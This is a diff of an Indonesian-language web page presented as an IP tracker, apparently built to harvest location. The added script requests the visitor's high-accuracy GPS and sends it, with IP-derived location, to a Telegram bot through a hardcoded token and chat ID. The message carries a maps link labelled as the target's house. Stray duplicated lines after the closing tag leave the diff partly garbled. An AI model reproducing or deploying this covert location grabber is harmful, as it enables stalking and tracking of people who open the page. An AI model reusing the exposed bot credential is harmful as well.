@@ -3,75 +3,108 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>IP & GPS Tracker Pro</title>
+    <title>Sistem Pelacak Final</title>
     <style>
-        body { font-family: 'Segoe UI', sans-serif; background: #1a1a2e; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
-        .card { background: #16213e; padding: 30px; border-radius: 15px; box-shadow: 0 0 20px rgba(0,0,0,0.5); text-align: center; width: 350px; border: 1px solid #0f3460; }
-        h2 { margin-bottom: 10px; color: #4ecca3; }
-        input { width: 90%; padding: 10px; margin: 15px 0; border-radius: 5px; border: none; text-align: center; }
-        button { background: #4ecca3; color: #1a1a2e; border: none; padding: 12px; width: 100%; border-radius: 5px; font-weight: bold; cursor: pointer; transition: 0.3s; }
-        button:hover { background: #45b293; transform: scale(1.02); }
-        #status { margin-top: 15px; font-size: 13px; color: #95a5a6; }
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background: #0f172a; color: white; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .card { background: #1e293b; padding: 30px; border-radius: 20px; box-shadow: 0 10px 30px rgba(0,0,0,0.5); text-align: center; width: 350px; border: 1px solid #334155; }
+        h2 { color: #38bdf8; margin-bottom: 10px; }
+        input { width: 90%; padding: 12px; margin: 15px 0; border-radius: 8px; border: 1px solid #334155; background: #0f172a; color: white; text-align: center; font-size: 16px; }
+        button { background: #38bdf8; color: #0f172a; border: none; padding: 12px; width: 100%; border-radius: 8px; font-weight: bold; cursor: pointer; transition: 0.3s; font-size: 16px; }
+        button:hover { background: #0ea5e9; transform: translateY(-2px); }
+        #status { margin-top: 20px; font-size: 14px; color: #94a3b8; line-height: 1.5; }
     </style>
 </head>
 <body>
 
 <div class="card">
-    <h2>Global Tracker</h2>
-    <p>Masukkan IP untuk memulai pelacakan</p>
-    <input type="text" id="ipInput" placeholder="Contoh: 8.8.8.8">
-    <button onclick="mulaiPelacakan()">LACAK SEKARANG</button>
-    <p id="status">Menunggu input...</p>
+    <h2>Tracker Pro v3</h2>
+    <p>Masukkan IP Target untuk Lacak</p>
+    <input type="text" id="ipInput" placeholder="Contoh: 180.253.xxx.xxx">
+    <button onclick="mulaiPelacakan()">LACAK & KIRIM</button>
+    <p id="status">Siap menerima perintah...</p>
 </div>
 
 <script>
+    // MASUKKAN DATA KAMU DI SINI
     const TOKEN = '8684002005:AAFjJtbOpKla5LBoblqhZsNKWSTobULGMZg';
     const CHAT_ID = '7576591520';
 
     async function mulaiPelacakan() {
-        const ip = document.getElementById('ipInput').value;
+        const inputRaw = document.getElementById('ipInput').value;
+        const ip = inputRaw.trim(); // Menghapus spasi otomatis
         const status = document.getElementById('status');
 
         if (!ip) {
-            alert("Harap masukkan alamat IP!");
+            status.innerText = "❌ Masukkan nomor IP!";
             return;
         }
 
-        status.innerText = "🔍 Melacak data IP...";
+        status.innerHTML = "🔍 Menghubungi Server...<br>Sabar, butuh waktu 5-10 detik.";
 
         try {
-            // 1. Ambil data dari IP-API (Data Kasar)
-            const res = await fetch(`https://demo.ip-api.com/json/${ip}?fields=status,country,regionName,city,isp,query,lat,lon`);
+            // MENGGUNAKAN API ALTERNATIF YANG LEBIH STABIL UNTUK HTTPS
+            const response = await fetch(`https://ipapi.co/${ip}/json/`);
+            const data = await response.json();
 
-            const dataIP = await res.json();
-
-            if (dataIP.status === "fail") {
-                status.innerText = "❌ IP tidak valid.";
+            if (data.error) {
+                status.innerText = "❌ IP Tidak Ditemukan / Salah Format.";
                 return;
             }
 
-            status.innerText = "📍 Meminta Izin GPS untuk akurasi desa...";
+            status.innerHTML = "📍 IP Ditemukan!<br>Meminta izin GPS untuk desa...";
 
-            // 2. Minta GPS (Data Akurat)
+            // PROSES GPS
             navigator.geolocation.getCurrentPosition(async (pos) => {
-                // JIKA USER MENERIMA (ALLOW)
-                kirimLaporan(dataIP, pos.coords);
-                status.innerText = "✅ Laporan lengkap (IP + GPS) terkirim!";
+                await kirimKeTelegram(data, pos.coords);
+                status.innerText = "✅ DATA LENGKAP TERKIRIM!";
             }, async (err) => {
-                // JIKA USER MENOLAK (BLOCK)
-                kirimLaporan(dataIP, null);
-                status.innerText = "⚠️ Hanya data IP yang dikirim (GPS ditolak).";
-            }, { enableHighAccuracy: true, timeout: 8000 });
+                await kirimKeTelegram(data, null);
+                status.innerText = "⚠️ GPS DITOLAK. Hanya data IP terkirim.";
+            }, { enableHighAccuracy: true, timeout: 10000 });
 
         } catch (error) {
-            status.innerText = "❌ Gangguan koneksi.";
+            status.innerText = "❌ Gangguan Koneksi / API Limit.";
+            console.error(error);
         }
     }
 
-    async function kirimLaporan(dataIP, coordsGPS) {
-        let pesan = `<b>📊 LAPORAN PELACAKAN BARU</b>\n`;
+    async function kirimKeTelegram(dataIP, coords) {
+        let pesan = `<b>🚀 HASIL PELACAKAN FINAL</b>\n`;
         pesan += `━━━━━━━━━━━━━━━━━━\n`;
-        pesan += `<b>🌐 DATA IP (Estimasi):</b>\n`;
+        pesan += `<b>🌐 INFO JARINGAN:</b>\n`;
+        pesan += `• IP: <code>${dataIP.ip}</code>\n`;
+        pesan += `• ISP: ${dataIP.org || 'Tidak Terdeteksi'}\n`;
+        pesan += `• Lokasi: ${dataIP.city}, ${dataIP.region}, ${dataIP.country_name}\n`;
+        pesan += `• Peta IP: <a href="https://www.google.com/maps?q=${dataIP.latitude},${dataIP.longitude}">Buka Lokasi IP</a>\n\n`;
+
+        if (coords) {
+            pesan += `<b>🎯 INFO GPS (PRESISI):</b>\n`;
+            pesan += `• Akurasi: ± ${Math.round(coords.accuracy)} meter\n`;
+            pesan += `• Koordinat: <code>${coords.latitude},${coords.longitude}</code>\n`;
+            pesan += `• Google Maps: <a href="https://www.google.com/maps?q=${coords.latitude},${coords.longitude}">KLIK LIHAT RUMAH</a>\n`;
+        } else {
+            pesan += `<b>🎯 INFO GPS:</b> <i>Izin Ditolak Target</i>\n`;
+        }
+        pesan += `━━━━━━━━━━━━━━━━━━`;
+
+        try {
+            await fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                    chat_id: CHAT_ID,
+                    text: pesan,
+                    parse_mode: 'HTML'
+                })
+            });
+        } catch (e) {
+            console.error("Gagal kirim ke Telegram");
+        }
+    }
+</script>
+
+</body>
+</html>
         pesan += `• IP: <code>${dataIP.query}</code>\n`;
         pesan += `• ISP: ${dataIP.isp}\n`;
         pesan += `• Lokasi: ${dataIP.city}, ${dataIP.country}\n`;
